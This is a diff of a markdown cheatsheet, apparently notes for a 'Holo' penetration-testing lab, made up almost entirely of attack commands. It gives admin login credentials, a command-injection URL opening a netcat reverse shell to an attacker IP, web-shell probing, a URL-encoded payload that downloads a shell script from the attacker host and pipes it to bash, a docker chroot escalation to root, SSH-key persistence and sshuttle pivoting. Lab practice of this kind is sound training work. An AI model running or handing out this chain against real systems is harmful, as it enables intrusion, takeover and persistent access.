@@ -1,20 +1,35 @@
 # Holo Cheatsheet
 
+ [http://admin.holo.live/](http://admin.holo.live/)
+Log in with the credentials `admin:DBManagerLogin!`
+
 http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.107.22+4444
 
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
+www-data@f988aa7b2fb3:/var/www/html$ `curl 192.168.100.1:8080/shell.php?cmd=whoami`
+
+www-data@69cd1465ecc9:/var/www/admin$ `curl 192.168.100.1:8080/shell.php?cmd=hostname`
+
+`python3 -m http.server 80`
+
+`nc -lvnp 53`
 
 curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'
 
+`python3 -m http.server 80`
 
-curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.22%3A80%2Fshellscript.sh%7Cbash%20%26'
+`/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash`
 
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYM/RBce4CV+LpO9ixetmQVgtafM+N13lqlpVOz82p4Uzq1qj9J7WJynd2do0Jm4BY9ZxefMRsFEyNwdbSG1+R7jpsxWxUt/y0sACT45ohlESxrtT/U0WynYoWzxGyExO0SVNE58aYII81i5SIPKtjzSkeqMEZeMmJkUCdZANlswDiIfmMCcA15L3rTfxfpO9kPUrE9k5fbBT+MG5+Qe5mZuyjt48mfW+BPs2p/4kSnq4yF3qyjM9TB1xaDCmfYgyQTxNcCuDCKtV+2jug2QKX0RmQFH6xURCtKYjxZ1XhLpDeFwD5MfhXd2ATbC4s1EXZWqcPdMsVByzGKXLMbJRAr2RqCPjDWI3ub4KusV6u718L01THXph6jjUoAhJe3ojfwuBYt2BD56eugpTpaOhLd+FIExLlhXWe0zoK91Eyn2BdAxXQ2Rn+q70d6qwx+TFQcuiHukBAuYPktDdVG4iTFpCsdXvqaeLM0Z0U2O/Ga2l4hGXVya/rzuQScnAHEyE= kali@kali
-" > authorized_keys
+`cd ~/.ssh`
+`ssh-keygen -t rsa`
+`cat id_rsa.pub`
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCymd1SBNCCtwnLevPQupq7Zy/YxDIDdIHfhcv894fhTAfG+i4SgqBrLaHuwfIRU8MJh5at3nbNaINX7rre3W/BeUwamYSPh18x4xI3c4zcJ5iXUi5MZ/1qFPJNHLkogYyhTDW1Uc89/QDIYXhdzGRgqPnQUFg01juNkfoYFeGFmRFgrg4GzP3KwIW7hJGd0Zt4IXtrTldxpSAqnLjZk4P4lKoWAJsc3wvUTHyd0qM5Bhpr87uksCqB/U3KzMpD3V9cSuuwh+/xRNuVX2IsYHoqccmYuLwKXcfzY7yt6ueoFf+oGUMXB+Q3W9HdbxMGGwSsowfU4R1a0IO+9h5/raZOhDhsfXmURrlCjpAtdbt7TWPc//9OnThf5Zi6TkzKpbem3nIH7rHMzdzpi9/8dmPtNrpZ6Ddk6R1ktPw3MtcoWC6FfWSrr5BIanHq17fEbzlPayrGK/LRvXUvYICpEilHJrlfpAfMF0qR1GptD9HW2Vk760JfIaw3bnir7+BYKr0= kali@kali" > authorized_keys
+
+`ssh root@admin.holo.live -i id_rsa`
 
 
 
-
-
-sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /home/kali/.ssh/id_rsa" 10.200.110.0/24 -x 10.200.110.33
+`sshuttle -r root@admin.holo.live --ssh-cmd "ssh -i /home/kali/.ssh/id_rsa" 10.200.110.0/24 -x 10.200.110.33`
 
